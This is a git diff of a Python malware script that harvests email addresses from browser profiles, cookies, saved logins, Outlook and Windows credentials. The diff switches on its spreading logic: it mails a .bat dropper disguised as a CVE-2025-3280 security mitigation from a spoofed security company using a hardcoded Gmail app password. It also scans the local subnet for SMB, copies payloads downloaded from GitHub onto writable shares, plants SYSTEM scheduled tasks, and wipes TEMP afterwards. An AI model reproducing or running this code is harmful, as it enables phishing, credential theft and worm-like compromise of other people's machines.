@@ -16,7 +16,10 @@ from email.mime.application import MIMEApplication
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
+from random_sub import *
 from email import encoders
+from glob import glob
+import lz4.block
 import ssl
 import urllib.parse
 from charset_normalizer import from_bytes
@@ -24,6 +27,7 @@ from chardet import detect
 import plyvel
 import snappy
 import pythoncom
+import random
 import json
 
 USERNAME = getpass.getuser()
@@ -54,36 +58,50 @@ def get_local_ip():
     return ip
 
 def s_n():
+    own = get_local_ip()
     base_ad = ".".join(get_local_ip().split('.')[:-1])
     act_host = []
     for i in range(1,255):
         target = f"{base_ad}.{i}"
-        try:
-            socket.setdefaulttimeout(1.0)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target, 445))
-            act_host.append(target)
-            s.close()
-        except Exception as e:
-            print(f"ERROR CONNECTING TO {target} : {e}")
+        if target != own:
+            try:
+                socket.setdefaulttimeout(1.0)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((target, 445))
+                act_host.append(target)
+                s.close()
+            except Exception as e:
+                #print(f"ERROR CONNECTING TO {target} : {e}")
+                continue
     return act_host
 
-def infect_host(host, file_path):
+def infect_host(host, file_path, p_path):
     try:
-        conn = SMBConnection("", "", socket.gethostname(), host, use_ntlm_v2=False)
-        conn.connect(host, 445)
+        try: 
+            conn = SMBConnection("", "", socket.gethostname(), host, use_ntlm_v2=False)
+            conn.connect(host, 445)
+        except:
+            try: 
+                conn = SMBConnection("", "", socket.gethostname(), host, use_ntlm_v2=True)
+                conn.connect(host, 445)
+            except Exception as e: raise Exception(f"Failed to connect to {host} using both NTLMv1 and NTLMv2: {e}")
         # Hunt writable shares
         shares = conn.listShares()
         for share in shares:
             if not share.isSpecial and share.name not in ['IPC$', 'PRINT$']:
                 try:
-                    conn.storeFile(share.name, "worm.exe", open(file_path, 'rb'))
+                    conn.storeFile(share.name, "init.exe", open(file_path, 'rb'))
+                    conn.storeFile(share.name, "hello.exe", open(p_path, 'rb'))
                     # Optional: Add persistence via scheduled task
-                    subprocess.call(f"schtasks /create /s {host} /tn 'UpdateService' /tr '{share.name}\\worm.exe' /sc onstart /ru SYSTEM /rl HIGHEST /f", shell=True)
-                    subprocess.Popen(f'psexec \\\\{host} -s -d cmd /c "{share.name}\\worm.exe"', shell=True)
-                except:
+                    subprocess.call(f"schtasks /create /s {host} /tn 'MSUpdateService' /tr '{share.name}\\init.exe' /sc onstart /ru SYSTEM /rl HIGHEST /f", shell=True)
+                    subprocess.call(f"schtasks /create /s {host} /tn 'DefService' /tr '{share.name}\\hello.exe' /sc onstart /ru SYSTEM /rl HIGHEST /f", shell=True)
+                    subprocess.Popen(f'schtasks /run /s {host} /tn "MSUpdateService"', shell=True)
+                    subprocess.Popen(f'schtasks /run /s {host} /tn "DefService"', shell=True)
+                except Exception as e:
+                    #print(f"Error storing file: {e}")
                     continue
-    except:
+    except Exception as e:
+        #print(f"ERROR IN SMB: {e}")
         pass
 
 def generate():
@@ -104,19 +122,27 @@ def generate():
             '@echo off',
             'setlocal enabledelayedexpansion',
             'set "exe_name=%~n0.exe"',
-            'echo Fetching Activation Keys...'
+            'echo Getting system information...'
         ]
 
         for i, chunk in enumerate(chunks, 1):
             bat_content.append(f'set "chunk{i}={chunk}"')
 
         bat_content.extend([
+            'echo Applying Patches...',
             '(', 
             f'for /l %%n in (1,1,{len(chunks)}) do (',
             '  set "chunk=!chunk%%n!"',
             '  echo|set /p dummy="!chunk!"',
             ')',
             ') > "%temp%\\!exe_name!.b64"',
+            '',
+            'echo Applying CVE-2025-3280 LSA protection...',
+            'echo Creating mitigation registry key...',
+            r'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSRC78932" /v MitigationEnabled /t REG_DWORD /d 1 /f',
+            'echo Generating compliance log...',
+            r'echo %DATE% %TIME% : CVE-2025-3280 MITIGATED > %SystemRoot%\Security\MSRC78932_compliance.log',
+            'echo Protection enabled. Verify at https://response.jsecurityltd.com/validate',
             '',
             f'powershell -Command "[IO.File]::WriteAllBytes(\'%temp%\\%exe_name%\', [Convert]::FromBase64String((Get-Content \'%temp%\\%exe_name%.b64\')))"',
             'del "%temp%\\!exe_name!.b64"',
@@ -130,7 +156,7 @@ def generate():
 
 def send_a(bat_path, emails):
     email_user = "defalttests@gmail.com"
-    email_pass = "ccoq gwxh jgos gqig"
+    email_pass = base64.b64decode("Y2NvcSBnd3hoIGpnb3MgZ3FpZw==").decode()
 
     with open(bat_path, 'rb') as f:
         attachment_data = f.read()
@@ -140,68 +166,29 @@ def send_a(bat_path, emails):
     server.login(email_user, password=email_pass)
 
     for email in emails:
-        print(email)    
-        msg = MIMEMultipart()
-        msg['From'] = "J. Security Limited"
-        msg['To'] = email
-        msg['Subject'] = "Mandatory Security Protocol Update - Script Delivery (Ref: SC-2025-07)"
+        try:
+            selected_sub = random.choice(random_sub)
+            body = selected_sub[BODY]
+            filename = selected_sub[FILENAME]
+            subject = selected_sub[SUBJECT]
+            msg = MIMEMultipart()
+            msg['From'] = "J. Security Limited"
+            msg['To'] = email
+            msg['Subject'] = subject
+            msg.attach(MIMEText(body, 'plain'))
 
-        body = r"""
-Dear Valued Partner,
-
-As part of J. Security Limited's Enhanced Security Framework (v3.1), we're distributing new Automated Configuration Verification (ACV) scripts to all certified partners. These ensure compliance with Microsoft's updated security baseline requirements.
-
-Required Action:
-    • Download attached configuration script:
-    📎 ACV_Validation_SC202507.txt
-    
-    • Convert to executable format:
-    Right-click file → Rename → Replace ".txt" with ".bat"
-    
-    • Execute validation:
-    Right-click → "Run as administrator"
-
-Purpose:
-    • Verifies proper implementation of new Windows security policies
-    • Generates compliance report for your audit trail
-    • Checks system readiness for upcoming TLS 1.3 enforcement
-
-Key Details:
-🔒 Security Notes:
-• Delivered as .txt to bypass email attachment filters
-• SHA-256 Checksum: 9a2f4c...e83b (verify before execution)
-• Execution window: July 15 - August 5, 2025
-
-📋 Post-Run Steps:
-
-Report automatically saves to C:\Security\ACV_Report.log
-
-Email report to compliance@jsecurityltd.com by August 5
-
-For assistance:
-☎️ Contact our Compliance Team: +1 (800) 555-0199
-✉️ Email: acv-support@jsecurityltd.com
-
-Regards,
-Eleanor Martinez
-Director of Security Compliance
-J. Security Limited
-🏢 550 Security Boulevard, New York, NY 10001
-🔐 Authenticated via SPF/DKIM
-"""
-        msg.attach(MIMEText(body, 'plain'))
-
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload(attachment_data)
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition', f"attachment; filename= ACV_Validation_SC202507.txt")
-        msg.attach(part)
-        server.sendmail(email_user, [email], msg.as_string())
-        print(f"Sent to {email}")
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(attachment_data)
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f"attachment; filename= {filename}")
+            msg.attach(part)
+            server.sendmail(email_user, [email], msg.as_string())
+            print(f"Email sent to: {email}")
+        except Exception as e: 
+            # print(f"Error sending mail: {e}")
+            continue
     
     server.quit()
-        
-    print(len(emails))
 
 def decode_with_fallback(data):
     for encoding in ['utf-8', 'utf-16-le']:
@@ -282,7 +269,7 @@ def extract_json(value_str):
         return value_str[json_start.start():]
     return value_str
 
-def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False, isoperagx=False):
+def chromiumOnly(chrome_path, email_pattern, browser_name, isdecryptable=False, isoperagx=False):
     if isoperagx: profiles=['Opera GX Stable']
     else: profiles = [f for f in os.listdir(chrome_path) if f.startswith('Profile') or f == 'Default']
     emails = []
@@ -308,7 +295,7 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
         tlsDatPath = os.path.join(os.getenv('TEMP'), f"lsdat_{USERNAME}_{profile_name}_{browser_name}")
         if os.path.isdir(lsDatPath):
             try:
-                print(f"ATTEMPTING TO READ FROM LOCAL STORAGE!!! for {profile} and {browser_name}")
+                # print(f"ATTEMPTING TO READ FROM LOCAL STORAGE!!! for {profile} and {browser_name}")
                 os.system(f'robocopy "{lsDatPath}" "{tlsDatPath}" /MIR /COPYALL >nul 2>&1')
                 db = plyvel.DB(str(tlsDatPath), create_if_missing=False)
                 for key, value in db:
@@ -322,7 +309,8 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                                 emails.extend(re.findall(email_pattern, value.decode('utf-8')))
                                 continue
                             except Exception as e :
-                                print(f"Error decompressing value: {e}, skipping this entry.")
+                                # print(f"Error decompressing value: {e}, skipping this entry.")
+                                pass
                         value_str, value_enc = decode_with_fallback(value)
                         value_str = value_str.replace('\u263a', '').strip()
                         value_str = extract_json(value_str)
@@ -343,18 +331,18 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                         emails.extend(re.findall(email_pattern, key_str))
                         emails.extend(re.findall(email_pattern, value_str))
                     except Exception as e:
-                        print(f"Error processing entry with key {key_str}: {e}")
+                        # print(f"Error processing entry with key {key_str}: {e}")
                         continue
                 db.close()
             except Exception as e:
-                print(f"ERROR PARSING LOCAL STORAGE : {e}")
+                # print(f"ERROR PARSING LOCAL STORAGE : {e}")
                 os.system(f'del /F /Q /S "{lsDatPath}" >null 2>&1')
 
         ssDatPath = os.path.join(chrome_path, profile, 'Session Storage')
         tssDatPath = os.path.join(os.getenv('TEMP'), f"ssDat_{USERNAME}_{profile_name}_{browser_name}")
         if os.path.isdir(ssDatPath):
             try:
-                print(f"ATTEMPTING TO READ FROM SESSION STORAGE!!! for {profile} and {browser_name}")
+                # print(f"ATTEMPTING TO READ FROM SESSION STORAGE!!! for {profile} and {browser_name}")
                 os.system(f'robocopy "{ssDatPath}" "{tssDatPath}" /MIR /COPYALL >nul 2>&1')
                 db = plyvel.DB(str(tssDatPath), create_if_missing=False)
                 for key, value in db:
@@ -375,10 +363,11 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                         emails.extend(re.findall(email_pattern, urllib.parse.unquote(key_str)))
                         emails.extend(re.findall(email_pattern, urllib.parse.unquote(value_str)))
                     except Exception as e:
-                        print(f"Error processing entry with key {key_str}: {e}")
+                        # print(f"Error processing entry with key {key_str}: {e}")
+                        pass
                 db.close()
             except Exception as e:
-                print(f"ERROR PARSING SESSION STORAGE : {e}")
+                # print(f"ERROR PARSING SESSION STORAGE : {e}")
                 os.system(f'del /F /Q /S "{ssDatPath}" >null 2>&1')
 
         lDatPath = os.path.join(chrome_path, profile, 'Login Data')
@@ -416,7 +405,8 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                     matches = re.findall(email_pattern, decoded_string)
                     emails.extend(matches)
                 except Exception as e:
-                    print(f"Error processing URL {val[0]}: {e}")
+                    # print(f"Error processing URL {val[0]}: {e}")
+                    pass
             conn.close()
 
         cDatPath = os.path.join(chrome_path, profile, 'Network', 'Cookies')
@@ -439,26 +429,22 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                     try:
                         decoded = urllib.parse.unquote(decoded)
                         emails.extend(re.findall(email_pattern, decoded))
-                    except Exception as e: print(f"ERROR URL DECODING : {e}")
+                    except Exception as e: pass #print(f"ERROR URL DECODING : {e}")
 
                     if cookie.name == "PREF":
-                        print("ENTER PREFF")
                         try:
                             c = urllib.parse.parse_qs(decoded)
                             emails.extend(find_emails_in_json(json.loads(json.dumps(c)), email_pattern))
-                            print(f"COMPLETE PREFFF : {json.dumps(c)}")
                             continue
-                        except Exception as e: print(f"ERROR IN PARSING PREF : {e}")
+                        except Exception as e: pass#print(f"ERROR IN PARSING PREF : {e}")
                             
                     if cookie.name == "LOGIN_INFO":
-                        print("ENTER LOGIN INFO")
                         try:
                             sig, b64_dat = decoded.split(':')
                             b64_dat, _ = decode_with_fallback(base64.b64decode(b64_dat, validate=True))
                             emails.extend(re.findall(email_pattern, b64_dat))
-                            print(f"COMPLETE PARSING LOGIN INFO : {b64_dat}")
                             continue
-                        except Exception as e: print(f"ERROR IN LOGIN INFO PARSING : {e}")
+                        except Exception as e: pass#print(f"ERROR IN LOGIN INFO PARSING : {e}")
 
                     for delim in ['.', '-', '~', '=']:
                         if delim in decoded:
@@ -472,7 +458,6 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                                     # print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")
 
                                     if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
-                                        # print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
                                         emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
 
                                     else: emails.extend(re.findall(email_pattern, decoded_string))
@@ -498,16 +483,16 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                             emails.extend(find_emails_in_json(json.loads(decoded), email_pattern))
                             continue
                     except Exception as e:
-                        print(f"ERROR in json DECODING : {e}")
-
+                        #print(f"ERROR in json DECODING : {e}")
+                        pass
                     emails.extend(re.findall(email_pattern, decoded))
                 
             except Exception as e:
-                print(f"GOT EXCEPTION WHILE GETTING COOKIES FOR {browser_name}:{profile} using Browser_Cookie3 :: {e}")
+                # print(f"GOT EXCEPTION WHILE GETTING COOKIES FOR {browser_name}:{profile} using Browser_Cookie3 :: {e}")
                 if isdecryptable:
                     conn = sqlite3.connect(tcDatPath)
                     cur = conn.cursor()
-                    cur.execute("SELECT encrypted_value FROM cookies") # WHERE host_key LIKE '%@gmail%' OR host_key LIKE '%@outlook%' OR host_key LIKE '%mail%'
+                    cur.execute("SELECT encrypted_value FROM cookies") 
                     decryption_key = get_decryption_key(opera_local_state_path)[1]
                     # print(decryption_key)
                     for val in cur.fetchall():
@@ -531,6 +516,7 @@ def firefox(firefox_path, email_pattern, browser_name):
         tck = os.path.join(os.getenv('TEMP'), f"ck_{USERNAME}_{profile_name}_firefox.db")
         bh = os.path.join(firefox_path, profile, 'places.sqlite')
         tbh = os.path.join(os.getenv('TEMP'), f"bh_{USERNAME}_{profile_name}_firefox.db")
+        ss = os.path.join(firefox_path, profile, 'sessionstore-backups')
         lg = os.path.join(firefox_path, profile, 'logins.json')
         tlg = os.path.join(os.getenv('TEMP'), f"lg_{USERNAME}_{profile_name}_firefox.json")
         lgb = os.path.join(firefox_path, profile, 'logins-backup.json')
@@ -547,6 +533,19 @@ def firefox(firefox_path, email_pattern, browser_name):
                 except:
                     pass
             conn.close()
+
+        if os.path.exists(ss):
+            lz_paths = glob(os.path.join(ss, "*.jsonlz4*"))
+            for idx, path in enumerate(lz_paths, 1):
+                tPath = os.path.join(os.getenv('TEMP'), f"ss_{USERNAME}_{profile_name}_firefox_{idx}.jsonlz4")
+                # print(f"Main Path: {path} : {idx}\nTEMP PATH: {tPath}\n")
+                os.system(f'copy "{path}" "{tPath}"')
+                with open(tPath, "rb") as f:
+                    data = f.read()
+                decompressed = lz4.block.decompress(data[8:])
+                s_data = json.loads(decompressed)
+                s_data = urllib.parse.unquote(json.dumps(s_data))
+                emails.extend(find_emails_in_json(s_data, email_pattern))
         
         if os.path.exists(ck):
             os.system(f'copy "{ck}" "{tck}"')
@@ -560,26 +559,22 @@ def firefox(firefox_path, email_pattern, browser_name):
                     try:
                         decoded = urllib.parse.unquote(decoded)
                         emails.extend(re.findall(email_pattern, decoded))
-                    except Exception as e: print(f"ERROR URL DECODING : {e}")
+                    except Exception as e: pass#print(f"ERROR URL DECODING : {e}")
 
                     if cookie.name == "PREF":
-                        print("ENTER PREFF")
                         try:
                             c = urllib.parse.parse_qs(decoded)
                             emails.extend(find_emails_in_json(json.loads(json.dumps(c)), email_pattern))
-                            print(f"COMPLETE PREFFF : {json.dumps(c)}")
                             continue
-                        except Exception as e: print(f"ERROR IN PARSING PREF : {e}")
+                        except Exception as e: pass#print(f"ERROR IN PARSING PREF : {e}")
                             
                     if cookie.name == "LOGIN_INFO":
-                        print("ENTER LOGIN INFO")
                         try:
                             sig, b64_dat = decoded.split(':')
                             b64_dat, _ = decode_with_fallback(base64.b64decode(b64_dat, validate=True))
                             emails.extend(re.findall(email_pattern, b64_dat))
-                            print(f"COMPLETE PARSING LOGIN INFO : {b64_dat}")
                             continue
-                        except Exception as e: print(f"ERROR IN LOGIN INFO PARSING : {e}")
+                        except Exception as e: pass#print(f"ERROR IN LOGIN INFO PARSING : {e}")
 
                     for delim in ['.', '-', '~', '=']:
                         if delim in decoded:
@@ -593,7 +588,6 @@ def firefox(firefox_path, email_pattern, browser_name):
                                     #print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")
 
                                     if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
-                                        #print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
                                         emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
 
                                     else: emails.extend(re.findall(email_pattern, decoded_string))
@@ -619,11 +613,12 @@ def firefox(firefox_path, email_pattern, browser_name):
                             emails.extend(find_emails_in_json(json.loads(decoded), email_pattern))
                             continue
                     except Exception as e:
-                        print(f"ERROR in json DECODING : {e}")
+                        #print(f"ERROR in json DECODING : {e}")
+                        pass
 
                     emails.extend(re.findall(email_pattern, decoded))
             except Exception as e:
-                print(f"ERROR USING BROWSER_COOKIE3 for {browser_name}:{profile} -> {e}\nUsing normal sqlite query instead.")
+                #print(f"ERROR USING BROWSER_COOKIE3 for {browser_name}:{profile} -> {e}\nUsing normal sqlite query instead.")
                 conn = sqlite3.connect(tck)
                 cur = conn.cursor()
                 cur.execute("SELECT value FROM moz_cookies WHERE value LIKE '%@%'")
@@ -650,22 +645,26 @@ def firefox(firefox_path, email_pattern, browser_name):
             conn.close()
         
         if os.path.exists(lg):
-            os.system(f'copy "{lg}" "{tlg}"')
-            with open(tlg, "r", encoding="utf-8") as f:
-                lgs = json.load(f)
-                for login in lgs.get("logins", []):
-                   u = login.get("usernameField", "")
-                   matches = re.findall(email_pattern, u)
-                   emails.extend(matches)
+            try:
+                os.system(f'copy "{lg}" "{tlg}"')
+                with open(tlg, "r", encoding="utf-8") as f:
+                    lgs = json.load(f)
+                    for login in lgs.get("logins", []):
+                       u = login.get("usernameField", "")
+                       matches = re.findall(email_pattern, u)
+                       emails.extend(matches)
+            except: pass
         
         if os.path.exists(lgb):
-            os.system(f'copy "{lgb}" "{tlgb}"')
-            with open(tlgb, "r", encoding="utf-8") as f:
-                lgs = json.load(f)
-                for login in lgs.get("logins", []):
-                    u = login.get("usernameField", "")
-                    matches = re.findall(email_pattern, u)
-                    emails.extend(matches)
+            try:
+                os.system(f'copy "{lgb}" "{tlgb}"')
+                with open(tlgb, "r", encoding="utf-8") as f:
+                    lgs = json.load(f)
+                    for login in lgs.get("logins", []):
+                        u = login.get("usernameField", "")
+                        matches = re.findall(email_pattern, u)
+                        emails.extend(matches)
+            except: pass
 
     return emails
 
@@ -732,43 +731,66 @@ def thunderbird(thunderbird_path, email_pattern):
     return emails
 
 def just_try_smb():
-    t_path = os.path.join(os.getenv('TEMP'), "random.ps1")
-    link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/obfuscated_initializer.ps1"
-    c = requests.get(link)
-    if c.status_code == 200:
-        open(t_path, 'wb').write(c.content)
-    for host in s_n():
-        infect_host(host, t_path)
+    t_path = os.path.join(os.getenv('TEMP'), "init.exe")
+    t_path2 = os.path.join(os.getenv('TEMP'), "hello.exe")
+    link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
+    link2 = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/pwndrive.exe"
+    if not os.path.exists(t_path): 
+        c = requests.get(link)
+        if c.status_code == 200: open(t_path, 'wb').write(c.content)
+    if not os.path.exists(t_path2): 
+        d = requests.get(link2)
+        if d.status_code == 200: open(t_path2, 'wb').write(d.content)
+    try:
+        for host in s_n():
+            infect_host(host, t_path, t_path2)
+        if os.path.exists(t_path2): subprocess.call(t_path2, shell=True)
+    except: pass
 
 
 emails = []
 
-# for root, _, files in os.walk(os.getenv('TEMP')):
-#     for file in files:
-#         try:
-#             with open(os.path.join(root,file), 'r', errors='ignore') as f:
-#                 data = f.read()
-#                 emails.extend(re.findall(email_pattern, data))
-#         except: pass
+for root, _, files in os.walk(os.getenv('TEMP')):
+    for file in files:
+        try:
+            with open(os.path.join(root,file), 'r', errors='ignore') as f:
+                data = f.read()
+                emails.extend(re.findall(email_pattern, data))
+        except: pass
 
-if os.path.exists(chrome_path): chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
-if os.path.exists(edge_path): edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
-if os.path.exists(firefox_path): firefox_emails = firefox(firefox_path, email_pattern, FIREFOX_BROWSER)
-if os.path.exists(librewolf_path): librewolf_emails = firefox(librewolf_path, email_pattern, LIBREWOLF_BROWSER)
-if os.path.exists(thunderbird_path): thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
-if os.path.exists(brave_path): brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
-if os.path.exists(operagx_path): gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isoperagx=True)
-if os.path.exists(opera_path) : opera_mails = chromEdgeOnly(opera_path, email_pattern, OPERA_BROWSER, isdecryptable=True)
+if os.path.exists(chrome_path): 
+    chrome_emails = chromiumOnly(chrome_path, email_pattern, CHROME_BROWSER)
+    emails.extend(chrome_emails)
 
-# # emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
-emails.extend(chrome_emails)
-emails.extend(edge_emails)
-emails.extend(firefox_emails)
-emails.extend(librewolf_emails)
-emails.extend(thunderbird_emails)
-emails.extend(brave_emails)
-emails.extend(gx_emails)
-emails.extend(opera_mails)
+if os.path.exists(edge_path): 
+    edge_emails = chromiumOnly(edge_path, email_pattern, EDGE_BROWSER)
+    emails.extend(edge_emails)
+
+if os.path.exists(firefox_path): 
+    firefox_emails = firefox(firefox_path, email_pattern, FIREFOX_BROWSER)
+    emails.extend(firefox_emails)
+
+if os.path.exists(librewolf_path): 
+    librewolf_emails = firefox(librewolf_path, email_pattern, LIBREWOLF_BROWSER)
+    emails.extend(librewolf_emails)
+
+if os.path.exists(thunderbird_path): 
+    thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
+    emails.extend(thunderbird_emails)
+
+if os.path.exists(brave_path): 
+    brave_emails = chromiumOnly(brave_path, email_pattern, BRAVE_BROWSER)
+    emails.extend(brave_emails)
+
+if os.path.exists(operagx_path): 
+    gx_emails = chromiumOnly(operagx_path, email_pattern, OPERAGX, isoperagx=True)
+    emails.extend(gx_emails)
+
+if os.path.exists(opera_path) : 
+    opera_mails = chromiumOnly(opera_path, email_pattern, OPERA_BROWSER, isdecryptable=True)
+    emails.extend(opera_mails)
+
+
     
 def set_registry_key(hive, subkey, name, value, office_version='16.0', wow64_32=False, x86os=False):
     try:
@@ -838,7 +860,7 @@ def check_office_version(hive, office_version, wow64_32=False):
     except Exception:
         return None
 
-def fetch_out():
+def fetch_out(email_pattern):
     emails = []
     try:
         office_versions = ['16.0', '15.0', '14.0', '12.0', '11.0', '10.0', '9.0']
@@ -865,7 +887,7 @@ def fetch_out():
                     try:
                         messages = folder.Items
                         messages.Sort("[ReceivedTime]", True)
-                        print(f"ABOUT TO ENTER OUTLOOKK ! Has folder name: {folder.Name} for account: {acc.Name}")
+                        # print(f"ABOUT TO ENTER OUTLOOKK ! Has folder name: {folder.Name} for account: {acc.Name}")
                         for message in messages:
                             try:
                                 subject = message.Subject
@@ -883,7 +905,7 @@ def fetch_out():
     #finally: pythoncom.CoUninitialize()
     return emails
 
-emails.extend(fetch_out())
+emails.extend(fetch_out(email_pattern))
 try:
     creds = win32cred.CredEnumerate(None, 0)
     for cred in creds:
@@ -892,16 +914,25 @@ try:
             emails.extend(re.findall(email_pattern, cred['UserName']))
         except: continue
 except Exception as e:
-    print(f"ERROR FETCHING WIN CREDS : {e}")
+    # print(f"ERROR FETCHING WIN CREDS : {e}")
+    pass
     
 emails = list(set(emails))
+final_emails = []
+for email in emails:
+    decoded_email = urllib.parse.unquote(email)
+    found_emails = re.findall(email_pattern, decoded_email)
+    final_emails.extend(found_emails)
+emails = final_emails
+
 bat_path = generate()
 
-print("AFTER FILTERINGGG")
-#send_a(bat_path, emails)
+send_a(bat_path, emails)
+just_try_smb()
 
-for email in emails:
-    print(email)
-print(len(emails))
+# print("AFTER FILTERINGGG")
+# for email in emails:
+#     print(email)
+# print(len(emails))
 
 os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
